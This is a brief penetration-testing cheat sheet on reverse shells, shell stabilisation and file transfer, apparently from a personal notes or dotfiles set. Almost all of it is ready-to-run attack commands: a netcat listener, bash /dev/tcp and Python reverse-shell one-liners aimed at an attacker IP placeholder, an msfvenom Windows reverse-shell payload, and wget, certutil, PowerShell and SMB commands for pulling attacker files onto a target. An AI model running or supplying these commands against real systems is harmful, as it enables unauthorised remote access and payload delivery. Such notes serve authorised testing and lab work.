Reverse shells, stabilization, file transfer
++++++++++++++++++++++++++++++++++++++++
# Listener (offensive.zsh has `hethttp` for a quick file server):
rlwrap nc -lvnp 9001
# Common callbacks (set <your-ip>/<port>):
bash -i >& /dev/tcp/<your-ip>/9001 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<your-ip>",9001));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh"])'
# Windows payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your-ip> LPORT=9001 -f exe -o shell.exe

# Stabilize a dumb shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'   # then Ctrl-Z; stty raw -echo; fg; export TERM=xterm

# File transfer:
python3 -m http.server 8000                       # serve from attacker
#   target: wget http://<your-ip>:8000/file  |  curl -O ...
#   windows: certutil -urlcache -f http://<your-ip>:8000/file file.exe
#   windows: powershell iwr http://<your-ip>:8000/file -OutFile file.exe
impacket-smbserver share . -smb2support           # SMB drop (great for Windows)
